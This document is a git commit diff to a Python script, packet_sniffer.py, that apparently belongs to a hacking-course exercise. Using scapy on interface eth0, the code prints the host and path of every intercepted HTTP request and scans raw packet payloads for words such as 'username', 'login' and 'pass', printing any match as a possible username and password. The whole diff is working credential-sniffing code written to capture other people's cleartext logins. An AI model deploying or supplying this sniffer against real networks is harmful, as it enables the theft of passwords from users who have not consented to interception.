392925330027bf6eeba63474533566b7556da2a2
tugayakca <tugayakca96@gmail.com>
2020-08-24 11:07:00 +0300

    the last version of code

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -9,16 +9,30 @@ def sniff(interface):
     # store = false  means not save my computer just write screen , prn = recursive function after to catched data
 
 
+def get_url(packet):
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+
+
+def get_login_info(packet):
+    if packet.haslayer(scapy.Raw):  # to show username password
+        # print(packet.show())            #to show all layer by layer  if not  upside line
+        load = packet[scapy.Raw].load
+        keywords = ["username", "user", "login", "Password", "pass"]
+        for keyword in keywords:
+            if keyword.encode() in load:
+                return load
+
+
 def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):  # to use filter
-        if packet.haslayer(scapy.Raw):  # to show username password
-            # print(packet.show())            #to show all layer by layer  if not  upside line
-            load = packet[scapy.Raw].load
-            keywords = ["username", "user", "login", "Password", "pass"]
-            for keyword in keywords:
-                if keyword.encode() in load:
-                    print(load)
-                    break
+        url = get_url(packet)  # to show link
+
+        print("[+] HTTP Request >>" + str(url))
+
+        login_info = get_login_info(packet)
+        if login_info:
+            print("\n\n[+] Possible username/password > " +
+                  str(login_info) + "\n\n")
 
 
 sniff("eth0")
